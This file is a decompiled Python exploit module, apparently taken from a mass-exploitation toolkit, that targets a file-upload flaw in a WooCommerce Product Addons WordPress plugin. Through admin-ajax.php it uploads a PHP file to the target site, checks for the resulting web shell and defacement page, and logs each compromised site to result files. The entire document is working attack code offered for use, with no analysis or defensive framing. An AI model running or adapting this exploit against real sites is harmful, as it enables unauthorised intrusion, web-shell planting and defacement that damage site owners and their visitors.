# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\WooCommerce_ProductAddonsExp.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        Exp = 'http://' + site + '/wp-admin/admin-ajax.php'
        Postdata = {'action': 'nm_personalizedproduct_upload_file','name': 'upload.php'}
        FileData = {'file': ('settings_auto.php', open('files/settings_auto.php', 'rb'),
                  'multipart/form-data')
           }
        GoT = requests.post(Exp, files=FileData, data=Postdata, timeout=10, headers=Headers)
        if GoT.status_code == 200 or 'success' in GoT.content:
            UploadPostPath = 'http://' + site + '/wp-content/uploads/product_files/upload.php'
            CheckShell = requests.get(UploadPostPath, timeout=10, headers=Headers)
            if 'Vuln!!' in CheckShell.content:
                shellChecker = requests.get('http://' + site + '/wp-content/vuln.php', timeout=10, headers=Headers)
                if 'Vuln!!' in shellChecker.content:
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                IndexCheck = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                if 'Vuln!!' in IndexCheck.content:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')